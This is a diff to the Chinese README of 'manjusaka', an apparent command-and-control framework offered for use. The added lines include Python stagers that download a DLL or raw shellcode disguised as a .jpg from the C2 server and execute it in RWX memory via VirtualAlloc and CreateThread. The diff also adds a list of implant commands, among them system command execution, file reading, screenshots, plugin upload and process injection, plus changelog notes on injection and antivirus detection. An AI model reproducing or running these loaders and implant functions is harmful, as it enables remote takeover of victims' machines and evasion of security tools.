@@ -16,6 +16,7 @@
 ##系统架构： ![](https://github.com/YDHCUI/manjusaka/blob/main/images/0.jpg)
 
 ## 使用方法
+配置conf.toml 运行主文件
 ```bash
 [root@devops nps]# ./manjusaka
 [NPS] 2022/09/14 15:57:21 初始用户: manjusaka  密码: ZbFCa2L2LRd5
@@ -28,33 +29,58 @@
 [NPS] 2022/09/14 15:57:21 NPC下载路由 : /:target/assert/:sys/bg.jpg
 [NPS] 2022/09/14 15:57:21 NPC文件路由 : /images/:fid/logo.png
 ```
-则NPS访问地址为  http://192.168.93.217:3200/manjusaka 
+则NPS访问地址为  http://192.168.93.217:3200/manjusaka  
+账号密码见初始日志，每个人生成的密码及默认路由都不一样 如需修改 请自行编辑nps.db文件
 
 
-1、创建项目，默认有一个公共项目，选择当前项目后 可在回传结果里面查看当前项目回传的信息
+1、创建项目，默认有一个公共项目，通过项目【状态】开关可以控制项目是否启用状态。选择当前项目后 可在回传结果里面查看当前项目回传的信息。
 
 ![](https://github.com/YDHCUI/manjusaka/blob/main/images/1.png)
 
 
-2、根据项目 生成npc 可以直接使用exe或elf格式的npc。也可以使用其它语言加载npc母体 比如使用python加载npc
+2、根据项目 生成npc 可以直接使用exe或elf格式的npc。也可以使用其它语言加载npc母体 比如使用python加载npc母体dll
  
 ```python
 import requests
 from ctypes import cdll
-
-res = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/dll/bg.jpg")
+res = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/dll/x64/bg.jpg")
 with open("a.dll","wb") as f:
     f.write(res.content)
+cdll.LoadLibrary("a.dll").main()
 
-dll = cdll.LoadLibrary("a.dll")
-dll.main()
+```
+
+或者使用shellcode内存加载的形式
+```python
+import requests
+import ctypes
+shellcode = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/bin/x64/bg.jpg").content
+rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
+ctypes.windll.kernel32.RtlMoveMemory(rwxpage, shellcode, len(shellcode))
+handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
+ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
 
 ```
 
 
 ![](https://github.com/YDHCUI/manjusaka/blob/main/images/2.png)
 
-3、npc上线，点选中该npc即可对其进行操作
+3、npc上线，点选中该npc即可对其进行操作， 输入help可查看帮助。目前支持的操作命令如下：
+```
+help      打印帮助 
+ps        查看进程 eg: ps
+ss        查看网络连接 eg: ss
+ls        枚举文件 eg: ls /
+cd        切换目录 eg: cd / 
+sh        执行系统命令  eg: sh ps -aux  , sh tasklist  
+cat       读取文本 cat a.txt
+screen    执行截屏 screen (可能会报毒。。待优化)
+wget      下载文件 eg: wget http://192.168.1.1/a.txt <a.txt>   文件名可选 默认当前  
+start     执行插件可执行文件 eg: start name <args>   需要可执行文件在plugins目录下 会自动把插件传到目标机器上面
+pl        执行插件 eg: pl plugname <plugargs>     需要插件在plugins目录下 
+inject    注入进程 eg: inject pid <shellcodeurl>  shellcodeurl可选 默认下载当前shellcode下载链接 
+
+```
 
 ![](https://github.com/YDHCUI/manjusaka/blob/main/images/3.png)
 
@@ -161,7 +187,21 @@ message PlugResult {
 ## 更新
 
 ### todo
-添加 PPID spoofer 支持
+
+
+### v0.7
+1、新增shellcode加载方式，新增系统位数区分
+
+2、去除nps db的agents表, 使用内存记录npc列表 将进程名称改为进程全路径
+
+3、优化npu推送模式, 修复大量npc时的npu卡顿问题 
+
+4、新增进程注入命令 简单实现 CopySelf（copyself会报毒慎用...待优化）
+https://github.com/malware-unicorn/rusty-memory-loadlibrary/blob/9eddd40949515733239f94df6499d2cded08ec84/src/main.rs
+
+5、配置文件加密，配置分阶段加载。
+
+6、去除了没啥用的功能
 
 
 ### v0.6
@@ -218,3 +258,4 @@ message PlugResult {
 
 ## 交流
 https://discord.gg/YMqeN5Qyk4
+
